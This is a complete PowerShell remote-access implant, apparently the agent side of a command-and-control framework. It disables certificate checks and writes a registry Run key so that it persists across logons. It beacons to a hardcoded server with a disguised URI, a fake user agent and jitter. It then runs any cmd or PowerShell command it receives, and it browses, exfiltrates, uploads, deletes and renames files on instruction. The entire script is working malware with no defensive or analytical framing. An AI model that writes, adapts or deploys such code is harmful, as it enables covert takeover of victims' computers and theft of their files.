Add-Type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;

public class TrustAllCertsPolicy : ICertificatePolicy {
    public bool CheckValidationResult(
        ServicePoint srvPoint, X509Certificate certificate,
        WebRequest request, int certificateProblem) {
        return true;
    }
}
"@

[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12


$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "HTTPSClient"
$regValue = "powershell -ExecutionPolicy Bypass -File `"$PSCommandPath`""
try {
    Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -ErrorAction Stop
    Write-Host "[+] Persistence added to Registry: $regPath\$regName"
} catch {
    Write-Host "[-] Failed to add persistence: $_"
}

$SERVER_IP = "192.168.233.230"
$SERVER_PORT = 1111
$SERVER_BASE = "https://${SERVER_IP}:${SERVER_PORT}"
$AUTH_ID = "254fa37e-5681-4da9-8d36-305854cc8b08"
$DEFAULT_USER_AGENT = "Mozilla/5.0"


[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls11 -bor [System.Net.SecurityProtocolType]::Tls


$script:SessionId = $null
$script:URIs = @("/support/troubleshoot")
$script:CurrentUserAgent = $DEFAULT_USER_AGENT
$script:SleepTime = 0.0
$script:StartJitter = 0
$script:EndJitter = 0
$script:PREPEND_OUTPUT = ""
$script:APPEND_OUTPUT = ""
$script:GET_CLIENT_HEADERS = @{}
$script:POST_CLIENT_HEADERS = @{}

function Get-URL {
    return $SERVER_BASE + ($script:URIs | Get-Random)
}

function Get-RequestHeaders {
    param([bool]$IsPost = $true)
    
    $headers = @{
        "User-Agent" = $script:CurrentUserAgent
    }
    
    if ($IsPost) {
        $headers["Content-Type"] = "application/json"
        foreach ($key in $script:POST_CLIENT_HEADERS.Keys) {
            if ($script:POST_CLIENT_HEADERS[$key] -and $script:POST_CLIENT_HEADERS[$key].Trim()) {
                $headers[$key] = $script:POST_CLIENT_HEADERS[$key]
            }
        }
    } else {
        foreach ($key in $script:GET_CLIENT_HEADERS.Keys) {
            if ($script:GET_CLIENT_HEADERS[$key] -and $script:GET_CLIENT_HEADERS[$key].Trim()) {
                $headers[$key] = $script:GET_CLIENT_HEADERS[$key]
            }
        }
    }
    
    $cleanHeaders = @{}
    foreach ($key in $headers.Keys) {
        if ($headers[$key] -and $headers[$key].Trim()) {
            $cleanHeaders[$key] = $headers[$key]
        }
    }
    
    return $cleanHeaders
}

function Invoke-Checkin {
    $payload = @{
        action = "checkin"
        token = $AUTH_ID
    } | ConvertTo-Json
    
    try {
        $headers = Get-RequestHeaders -IsPost $true
        $url = Get-URL
        
        $response = Invoke-WebRequest -Uri $url -Method Post -Body $payload -ContentType "application/json" -Headers $headers -UseBasicParsing
        
        if ($response.StatusCode -eq 200) {
            $responseData = $response.Content | ConvertFrom-Json
            
            if ($responseData) {
                $script:SessionId = $responseData.sid
                
                if ([string]::IsNullOrEmpty($script:SessionId)) {
                    return $false
                }
                
                if ($responseData.ua) { $script:CurrentUserAgent = $responseData.ua }
                if ($responseData.sj) { $script:StartJitter = [int]$responseData.sj }
                if ($responseData.ej) { $script:EndJitter = [int]$responseData.ej }
                if ($responseData.sl) { $script:SleepTime = [double]$responseData.sl }
                if ($responseData.ur) { $script:URIs = @($responseData.ur) }
                if ($responseData.pre) { $script:PREPEND_OUTPUT = $responseData.pre }
                if ($responseData.app) { $script:APPEND_OUTPUT = $responseData.app }
                
                return $true
            }
        }
    } catch {

    }
    
    return $false
}

function Apply-Jitter {
    if ($script:SleepTime -eq 0) {
        return
    }
    
    if ($script:StartJitter -eq 0 -and $script:EndJitter -eq 0) {
        $finalSleep = [Math]::Max(0, [Math]::Min(900, $script:SleepTime))
        if ($finalSleep -gt 0) {
            Start-Sleep -Seconds $finalSleep
        }
        return
    }
    
    if ($script:StartJitter -gt $script:EndJitter) {
        $temp = $script:StartJitter
        $script:StartJitter = $script:EndJitter
        $script:EndJitter = $temp
    }
    
    if ($script:StartJitter -eq $script:EndJitter) {
        $script:StartJitter = [Math]::Max(0, $script:StartJitter - 1)
    }
    
    try {
        $jitterAmount = Get-Random -Minimum $script:StartJitter -Maximum $script:EndJitter
        $finalSleep = $script:SleepTime + $jitterAmount
        $finalSleep = [Math]::Max(0, [Math]::Min(900, $finalSleep))
        
        if ($finalSleep -gt 0) {
            Start-Sleep -Seconds $finalSleep
        }
    } catch {
        if ($script:SleepTime -gt 0) {
            Start-Sleep -Seconds $script:SleepTime
        }
    }
}

function Execute-CMDCommand {
    param([string]$Command)
    
    try {
        if ($Command -match "&") {
            $parts = $Command -split "(?<![&])&(?!&)"
            $allOutput = ""
            
            foreach ($part in $parts) {
                $part = $part.Trim()
                if ($part) {
                    try {
                        $result = Invoke-Expression "cmd /c $part" 2>&1 | Out-String
                        $allOutput += $result
                    } catch {
                        $allOutput += "[-] Error: $_`n"
                    }
                }
            }
            return $allOutput
        }
        
        if ($Command -match "\|\|") {
            $parts = $Command -split "\|\|"
            $lastError = $null
            
            foreach ($part in $parts) {
                $part = $part.Trim()
                if ($part) {
                    try {
                        $result = Invoke-Expression "cmd /c $part" 2>&1 | Out-String
                        if ($result.Trim()) {
                            return $result
                        }
                        return "[+] Command executed (no output)`n"
                    } catch {
                        $lastError = $_
                        continue
                    }
                }
            }
            return "[-] All OR commands failed: $lastError`n"
        }
        
        if ($Command -match "&&") {
            $parts = $Command -split "&&"
            $allOutput = ""
            
            foreach ($part in $parts) {
                $part = $part.Trim()
                if ($part) {
                    try {
                        $result = Invoke-Expression "cmd /c $part" 2>&1 | Out-String
                        $allOutput += $result
                        if ($LASTEXITCODE -ne 0) {
                            $allOutput += "[-] Command failed, stopping AND chain`n"
                            return $allOutput
                        }
                    } catch {
                        $allOutput += "[-] Error in AND chain: $_`n"
                        return $allOutput
                    }
                }
            }
            return $allOutput
        }
        
        $result = Invoke-Expression "cmd /c $Command" 2>&1 | Out-String
        if ([string]::IsNullOrEmpty($result.Trim())) {
            return "[+] Command executed (no output)`n"
        }
        return $result
    } catch {
        return "[-] CMD error: $_`n"
    }
}

function Execute-PowerShellCommand {
    param([string]$Command)
    
    try {
        $result = Invoke-Expression $Command 2>&1 | Out-String
        if ([string]::IsNullOrEmpty($result.Trim())) {
            return "[+] PowerShell command executed (no output)`n"
        }
        return $result
    } catch {
        return "[-] PowerShell error: $_`n"
    }
}

function Browse-Directory {
    param([string]$Path)
    
    try {
        if ($Path.StartsWith("~")) {
            $Path = $Path.Replace("~", $env:USERPROFILE)
        }
        
        if (!(Test-Path $Path)) {
            return @{
                success = $false
                error = "Path does not exist: $Path"
                current_path = $Path
                parent_path = $null
                items = @()
            } | ConvertTo-Json -Compress
        }
        
        $items = @()
        try {
            $entries = Get-ChildItem -Path $Path -Force -ErrorAction Stop
        } catch {
            return @{
                success = $false
                error = "Permission denied to access $Path"
                current_path = $Path
                parent_path = $null
                items = @()
            } | ConvertTo-Json -Compress
        }
        
        foreach ($item in $entries) {
            try {
                $isDir = $item.PSIsContainer
                $modifiedTime = $item.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss")
                $sizeBytes = if ($isDir) { 0 } else { $item.Length }
                
                $items += @{
                    name = $item.Name
                    type = if ($isDir) { "directory" } else { "file" }
                    size = $sizeBytes
                    modified_time = $modifiedTime
                }
            } catch {
                continue
            }
        }
        
        $items = $items | Sort-Object @{Expression={$_.type -ne "directory"}}, name
        
        $parentPath = Split-Path $Path -Parent
        if ($Path -match "^[A-Za-z]:\\$" -or $Path -eq "/") {
            $parentPath = $null
        } elseif ($parentPath -eq $Path) {
            $parentPath = $null
        }
        
        $result = @{
            success = $true
            current_path = $Path
            parent_path = $parentPath
            items = $items
        }
        
        return $result | ConvertTo-Json -Compress
    } catch {
        return @{
            success = $false
            error = $_.Exception.Message
            current_path = $Path
            parent_path = $null
            items = @()
        } | ConvertTo-Json -Compress
    }
}

function Download-File {
    param([string]$FilePath)
    
    try {
        if (!(Test-Path $FilePath)) {
            return "ERROR: File not found: $FilePath"
        }
        
        $fileInfo = Get-Item $FilePath
        $filename = $fileInfo.Name
        $filesize = $fileInfo.Length
        
        $fileData = [System.IO.File]::ReadAllBytes($FilePath)
        $fileDataB64 = [Convert]::ToBase64String($fileData)
        
        return "file-data:${filename}|${filesize}|${fileDataB64}"
    } catch {
        return "ERROR: $($_.Exception.Message)"
    }
}

function Upload-File {
    param([string]$FilePath, [string]$FileDataB64)
    
    try {
        $fileData = [Convert]::FromBase64String($FileDataB64)
        $directory = Split-Path $FilePath -Parent
        
        if ($directory -and !(Test-Path $directory)) {
            New-Item -Path $directory -ItemType Directory -Force | Out-Null
        }
        
        [System.IO.File]::WriteAllBytes($FilePath, $fileData)
        return "SUCCESS: File uploaded to $FilePath"
    } catch {
        return "ERROR: $($_.Exception.Message)"
    }
}

function Delete-File {
    param([string]$FilePath)
    
    try {
        if (Test-Path $FilePath) {
            Remove-Item -Path $FilePath -Force -Recurse -ErrorAction Stop
            return "SUCCESS: Deleted $FilePath"
        } else {
            return "ERROR: Path not found: $FilePath"
        }
    } catch {
        return "ERROR: $($_.Exception.Message)"
    }
}

function Rename-File {
    param([string]$OldPath, [string]$NewPath)
    
    try {
        if (Test-Path $OldPath) {
            Rename-Item -Path $OldPath -NewName $NewPath -ErrorAction Stop
            return "SUCCESS: Renamed to $NewPath"
        } else {
            return "ERROR: Path not found: $OldPath"
        }
    } catch {
        return "ERROR: $($_.Exception.Message)"
    }
}

function Execute-Command {
    param([string]$Command)
    
    if ([string]::IsNullOrEmpty($Command)) {
        return "[no command]"
    }
    
    if ($Command.ToLower() -eq "ping") {
        return "pong`n"
    }
    
    if ($Command -match "^browse:") {
        $browsePath = $Command.Substring(7).Trim()
        if ([string]::IsNullOrEmpty($browsePath)) {
            $browsePath = (Get-Location).Path
        }
        
        try {
            $items = @()
            if (Test-Path $browsePath) {
                Get-ChildItem $browsePath -Force | ForEach-Object {
                    $items += @{
                        name = $_.Name
                        type = if ($_.PSIsContainer) { "directory" } else { "file" }
                        size = if ($_.PSIsContainer) { 0 } else { $_.Length }
                        modified_time = $_.LastWriteTime.ToString('yyyy-MM-dd HH:mm:ss')
                    }
                }
            }
            
            $result = @{
                success = $true
                current_path = $browsePath
                parent_path = (Split-Path $browsePath -Parent)
                items = ($items | Sort-Object { $_.type -ne 'directory' }, { $_.name.ToLower() })
            }
        } catch {
            $result = @{
                success = $false
                error = "$($_.Exception.Message)"
                current_path = $browsePath
                parent_path = $null
                items = @()
            }
        }
        
        $jsonData = $result | ConvertTo-Json -Compress
        $base64Data = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($jsonData))
        return "browse-data-${base64Data}`n"
    }
    
    if ($Command -match "^download-file:") {
        $filepath = $Command.Substring(14).Trim()
        if (Test-Path $filepath) {
            $fileData = [IO.File]::ReadAllBytes($filepath)
            $filename = [IO.Path]::GetFileName($filepath)
            $fileDataB64 = [Convert]::ToBase64String($fileData)
            return "file-data:${filename}|$($fileData.Length)|${fileDataB64}`n"
        }
        return "ERROR: File not found: $filepath`n"
    }
    
    if ($Command -match "^upload-file:") {
        $parts = $Command.Substring(12).Split('|', 2)
        if ($parts.Count -eq 2) {
            $filepath = $parts[0]
            $filedataB64 = $parts[1]
            
            try {
                $fileData = [Convert]::FromBase64String($filedataB64)
                $directory = [IO.Path]::GetDirectoryName($filepath)
                if ($directory -and !(Test-Path $directory)) {
                    New-Item -ItemType Directory -Path $directory -Force | Out-Null
                }
                [IO.File]::WriteAllBytes($filepath, $fileData)
                return "SUCCESS: File uploaded to $filepath`n"
            } catch {
                return "ERROR: $($_.Exception.Message)`n"
            }
        }
        return "ERROR: Invalid upload format`n"
    }
    
    if ($Command -match "^delete-file:") {
        $filepath = $Command.Substring(12).Trim()
        if (Test-Path $filepath) {
            Remove-Item $filepath -Force -Recurse
            return "SUCCESS: Deleted $filepath`n"
        }
        return "ERROR: File not found`n"
    }
    
    if ($Command -match "^rename-file:") {
        $parts = $Command.Substring(12).Split('|', 2)
        if ($parts.Count -eq 2) {
            $oldPath = $parts[0]
            $newPath = $parts[1]
            try {
                Rename-Item $oldPath $newPath -Force
                return "SUCCESS: Renamed to $newPath`n"
            } catch {
                return "ERROR: $($_.Exception.Message)`n"
            }
        }
        return "ERROR: Invalid rename format`n"
    }
    
    $upper = $Command.ToUpper()
    if ($upper -match "^EP ") {
        $psCommand = $Command.Substring(3).Trim()
        return Execute-PowerShellCommand -Command $psCommand
    }
    
    if ($upper -match "^EP") {
        $psCommand = $Command.Substring(2).Trim()
        return Execute-PowerShellCommand -Command $psCommand
    }
    
    return Execute-CMDCommand -Command $Command
}

function Get-Tasks {
    if ([string]::IsNullOrEmpty($script:SessionId)) {
        return $null
    }
    
    $payload = @{
        action = "get_tasks"
        sid = $script:SessionId
    } | ConvertTo-Json
    
    try {
        $headers = Get-RequestHeaders -IsPost $true
        $url = Get-URL
        
        $response = Invoke-WebRequest -Uri $url -Method Post -Body $payload -ContentType "application/json" -Headers $headers -UseBasicParsing
        
        if ($response.StatusCode -eq 200) {
            $data = $response.Content | ConvertFrom-Json
            if ($data -and $data.command) {
                return $data.command.Trim()
            }
        }
    } catch {

    }
    
    return $null
}

function Submit-Output {
    param([string]$Output)
    
    if ([string]::IsNullOrEmpty($script:SessionId)) {
        return
    }
    
    $encrypted = $Output
    $finalOutput = $script:PREPEND_OUTPUT + $encrypted + $script:APPEND_OUTPUT
    
    if ([string]::IsNullOrEmpty($finalOutput)) {
        $finalOutput = "[no output]"
    }
    
    $payload = @{
        action = "submit"
        sid = $script:SessionId
        out = $finalOutput
    } | ConvertTo-Json
    
    try {
        $headers = Get-RequestHeaders -IsPost $true
        $url = Get-URL
        
        Invoke-WebRequest -Uri $url -Method Post -Body $payload -ContentType "application/json" -Headers $headers -UseBasicParsing | Out-Null
    } catch {

    }
}

function Main-Loop {
    while ([string]::IsNullOrEmpty($script:SessionId)) {
        if (Invoke-Checkin) {
            break
        }
        Start-Sleep -Seconds (Get-Random -Minimum 20 -Maximum 60)
    }
    
    while ($true) {
        try {
            $command = Get-Tasks
            if ($command -and $command.Trim()) {
                $result = Execute-Command -Command $command
                Submit-Output -Output $result
            }
            Apply-Jitter
        } catch {
            Start-Sleep -Seconds (Get-Random -Minimum 30 -Maximum 120)
        }
    }
}


Main-Loop
